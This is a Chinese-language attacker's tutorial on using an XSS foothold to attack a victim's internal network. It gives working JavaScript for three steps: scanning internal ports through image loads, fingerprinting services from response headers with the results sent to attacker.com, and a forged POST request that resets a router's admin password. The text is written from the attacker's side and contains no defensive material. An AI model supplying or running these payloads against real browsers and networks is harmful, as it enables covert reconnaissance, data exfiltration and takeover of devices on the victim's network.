### XSS 怎么打内网

**1. 端口扫描**

这是最基础也最常见的利用方式。攻击者可以通过 JavaScript 构造请求（如 `<img>` 或 `<iframe>` 标签），尝试加载内网 IP 地址和端口，并根据加载成功或失败来判断端口是否开放

**基本思路：**

- **加载 `<img>` 标签**： `<img>` 标签的 `src` 属性可以指向内网 IP 和端口。如果图片能够加载成功，就说明该端口是开放的。可以通过 `onerror` 和 `onload` 事件来判断加载结果

  **示例代码：**

  ```javascript
  const targetIp = '192.168.1.1';
  const targetPorts = [80, 22, 445, 8080];
  
  targetPorts.forEach(port => {
    const img = new Image();
    img.onload = () => {
      // 端口开放
      console.log(`Port ${port} on ${targetIp} is open.`);
      // 将结果发送回攻击者服务器
      fetch(`http://attacker.com/log?ip=${targetIp}&port=${port}&status=open`);
    };
    img.onerror = () => {
      // 端口关闭或无法访问
      console.log(`Port ${port} on ${targetIp} is closed.`);
    };
    img.src = `http://${targetIp}:${port}`;
  });
  ```

- **加载 `<iframe>` 标签**： `<iframe>` 标签可以用来加载内网页面。如果加载成功，攻击者可以通过 JavaScript 获取页面的部分内容（但受同源策略限制）

**2. 服务指纹识别**

通过上一步的端口扫描，攻击者可以确定内网中有哪些服务是开放的。接下来，可以通过 JavaScript 发送 AJAX 请求到这些服务，然后根据响应头（如 `Server`、`X-Powered-By`）或页面内容来识别服务的类型和版本

**示例代码：**

```javascript
const targetUrl = 'http://192.168.1.1:8080';

fetch(targetUrl)
  .then(response => {
    // 检查响应头，获取服务信息
    const serverHeader = response.headers.get('Server');
    console.log(`Server on ${targetUrl} is: ${serverHeader}`);
    // 将结果发送回攻击者服务器
    fetch(`http://attacker.com/log?url=${targetUrl}&server=${serverHeader}`);
  })
  .catch(error => {
    console.error(`Could not connect to ${targetUrl}`);
  });
```

**3. 攻击内网路由器或管理后台**

许多内网路由器和管理系统都存在默认密码或已知漏洞。攻击者可以利用 XSS 漏洞，在受害者浏览器中构造并发送针对这些设备的请求

**示例：利用 CSRF 漏洞修改路由器密码**

假设某个路由器修改密码的请求是：`POST /admin/password_change`，并带上参数 `new_password=123456`。 攻击者可以通过 JavaScript 构造一个表单并提交，或者直接用 `fetch` 发送请求

**示例代码：**

```javascript
// 假设路由器IP是 192.168.1.1，并且修改密码的路径是 /admin/change_password
const routerIp = '192.168.1.1';
const newPassword = 'hacked_by_xss';

const formData = new FormData();
formData.append('password', newPassword);

fetch(`http://${routerIp}/admin/change_password`, {
  method: 'POST',
  body: formData
}).then(() => {
  console.log('Router password changed!');
});
```